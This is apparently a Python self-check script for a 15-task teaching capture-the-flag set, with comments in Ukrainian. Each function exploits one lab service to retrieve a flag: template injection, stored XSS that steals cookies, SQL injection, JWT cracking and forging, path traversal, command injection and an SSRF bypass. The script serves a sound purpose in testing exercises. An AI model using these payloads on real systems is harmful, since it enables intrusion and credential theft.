#!/usr/bin/env python3
"""Самоперевірка: проходить кожен із 15 тасків «як гравець» і звіряє отриманий прапор.
Лише стандартна бібліотека.  Приклад:  python3 check_challenges.py --host 10.10.15.124"""
import argparse
import base64
import codecs
import hashlib
import hmac
import json
import re
import struct
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
import zlib

from challenges import CHALLENGES

FLAG_RE = re.compile(rb"CTF\{[^}\s]+\}")


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *a, **k):
        return None


OPENER = urllib.request.build_opener(NoRedirect)


def http(url, method="GET", data=None, headers=None, json_body=None):
    h = dict(headers or {})
    body = None
    if json_body is not None:
        body, h["Content-Type"] = json.dumps(json_body).encode(), "application/json"
    elif data is not None:
        body = urllib.parse.urlencode(data).encode()
    req = urllib.request.Request(url, data=body, headers=h, method=method)
    try:
        with OPENER.open(req, timeout=15) as r:
            return r.status, dict(r.headers), r.read()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read()


def find(blob):
    m = FLAG_RE.search(blob if isinstance(blob, bytes) else blob.encode())
    return m.group(0).decode() if m else None


# ---------------- PNG без Pillow ----------------
def png_pixels(raw):
    pos, idat, w = 8, b"", 0
    while pos < len(raw):
        ln, typ = struct.unpack(">I4s", raw[pos:pos + 8])
        chunk = raw[pos + 8:pos + 8 + ln]
        if typ == b"IHDR":
            w, h, depth, ctype = struct.unpack(">IIBB", chunk[:10])
            assert depth == 8 and ctype in (2, 6), "очікується 8-bit RGB/RGBA"
            bpp = 3 if ctype == 2 else 4
        elif typ == b"IDAT":
            idat += chunk
        pos += 12 + ln
    data, stride, rows, prev = zlib.decompress(idat), w * bpp, [], bytearray(w * bpp)
    for y in range(h):
        f, line = data[y * (stride + 1)], bytearray(data[y * (stride + 1) + 1:(y + 1) * (stride + 1)])
        for i in range(stride):
            a = line[i - bpp] if i >= bpp else 0
            b, c = prev[i], (prev[i - bpp] if i >= bpp else 0)
            if f == 1: line[i] = (line[i] + a) & 255
            elif f == 2: line[i] = (line[i] + b) & 255
            elif f == 3: line[i] = (line[i] + (a + b) // 2) & 255
            elif f == 4:
                p = a + b - c
                pa, pb, pc = abs(p - a), abs(p - b), abs(p - c)
                line[i] = (line[i] + (a if pa <= pb and pa <= pc else b if pb <= pc else c)) & 255
        rows.append(line)
        prev = line
    return w, bpp, rows


def stego_extract(raw):
    w, bpp, rows = png_pixels(raw)
    out, cur, n = bytearray(), 0, 0
    for y in range(len(rows)):
        for x in range(w):
            cur = (cur << 1) | (rows[y][x * bpp] & 1)
            n += 1
            if n % 8 == 0:
                if cur == 0:
                    return bytes(out)
                out.append(cur)
                cur = 0
                if len(out) > 200:
                    return bytes(out)
    return bytes(out)


# ---------------- JWT без бібліотек ----------------
def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b"=")
def b64ud(s): return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


def jwt_sign(payload, secret):
    head = b64u(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")).encode())
    body = b64u(json.dumps(payload, separators=(",", ":")).encode())
    sig = b64u(hmac.new(secret.encode(), head + b"." + body, hashlib.sha256).digest())
    return (head + b"." + body + b"." + sig).decode()


def jwt_crack(token, words):
    head, body, sig = token.split(".")
    for w in words:
        if b64u(hmac.new(w.encode(), f"{head}.{body}".encode(), hashlib.sha256).digest()).decode() == sig:
            return w


# ---------------- експлойти ----------------
def x01(u):
    return find(http(u + "/request", "POST", {"name": "x", "account": "1", "note": "{{config.SECRET_FLAG}}"})[2])

def x02(u):
    return find(http(u + "/user?id=1337")[2])

def x03(u):
    payload = "<img src=x onerror=\"fetch('/collect?d='+encodeURIComponent(document.cookie))\">"
    http(u + "/", "POST", {"title": "pwn", "content": payload})
    for _ in range(25):  # бот відкриває блог у Chromium
        time.sleep(1)
        f = find(http(u + "/inbox")[2])
        if f:
            return f
    return None

def x04(u):
    q = urllib.parse.quote("' UNION SELECT 1,flag,3 FROM secrets-- ")
    return find(http(u + "/?q=" + q)[2])

def x05(u):
    body = http(u + "/reset", "POST", {"username": "admin"})[2].decode()
    link = re.search(r"/reset/confirm\?user=\w+&(?:amp;)?token=[\w-]+", body).group(0).replace("&amp;", "&")
    return find(http(u + link)[2])

def x06(u):
    return find(http(u + "/evidence.png")[2])

def x07(u):
    st, hd, _ = http(u + "/", "POST", {"username": "student", "password": "student123"})
    cookie = re.search(r"session_data=([^;]+)", hd.get("Set-Cookie", "")).group(1)
    d = json.loads(b64ud(cookie))
    d["role"] = "admin"
    forged = b64u(json.dumps(d).encode()).decode()
    return find(http(u + "/admin", headers={"Cookie": f"session_data={forged}"})[2])

def x08(u):
    tok = json.loads(http(u + "/api/login", "POST", json_body={"username": "reader", "password": "reader123"})[2])["token"]
    secret = jwt_crack(tok, ["admin", "secret", "password", "letmein", "lntu", "lntu2025", "lntu2026"])
    if not secret:
        return None
    forged = jwt_sign({"sub": "reader", "role": "admin"}, secret)
    return find(http(u + "/api/admin/flag", headers={"Authorization": "Bearer " + forged})[2])

def x09(u):
    for depth in range(2, 14):
        p = "....//" * depth + "etc/lntu/flag.txt"
        f = find(http(u + "/view?file=" + urllib.parse.quote(p))[2])
        if f:
            return f

def x10(u):
    return find(http(u + "/?host=" + urllib.parse.quote("127.0.0.1|cat /flag.txt"))[2])

def x11(u):
    assert b"/backup/" in http(u + "/robots.txt")[2]
    cfg = http(u + "/backup/site_config.old")[2].decode()
    user = re.search(r"admin_user=(\S+)", cfg).group(1)
    pwd = re.search(r"admin_pass=(\S+)", cfg).group(1)
    return find(http(u + "/admin/login", "POST", {"username": user, "password": pwd})[2])

def x12(u):
    cipher = http(u + "/message.txt")[2].decode().strip()
    return find(codecs.decode(base64.b64decode(bytes.fromhex(cipher)).decode(), "rot13"))

def x13(u):
    h = {"X-Forwarded-For": "10.0.0.5", "User-Agent": "LNTU-Staff/1.0", "Referer": "http://intranet.lntu.local/"}
    return find(http(u + "/", headers=h)[2])

def x14(u):
    return find(stego_extract(http(u + "/photo.png")[2]))

def x15(u):
    assert find(http(u + "/?url=http://localhost:9000/internal/flag")[2]) is None, "фільтр має блокувати localhost"
    return find(http(u + "/?url=" + urllib.parse.quote("http://127.1:9000/internal/flag"))[2])


EXPLOITS = {i: globals()[f"x{i:02d}"] for i in range(1, 16)}


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="localhost")
    ap.add_argument("--only", type=int, nargs="*", help="номери тасків")
    ap.add_argument("--no-bot", action="store_true", help="пропустити таск 3 (потрібен Chromium-бот)")
    a = ap.parse_args()
    bad = 0
    for c in CHALLENGES:
        n = c["n"]
        if (a.only and n not in a.only) or (a.no_bot and n == 3):
            print(f"[SKIP] {c['name']}")
            continue
        url = f"http://{a.host}:{c['port']}"
        try:
            got = EXPLOITS[n](url)
        except Exception as e:
            got = None
            err = f"{type(e).__name__}: {e}"
        else:
            err = "прапор не знайдено"
        if got == c["flag"]:
            print(f"[ OK ] {c['name']}")
        else:
            bad += 1
            print(f"[FAIL] {c['name']}  → {got or err}")
    print("\nУсе працює ✔" if not bad else f"\nПроблемних тасків: {bad}")
    return 1 if bad else 0


if __name__ == "__main__":
    sys.exit(main())
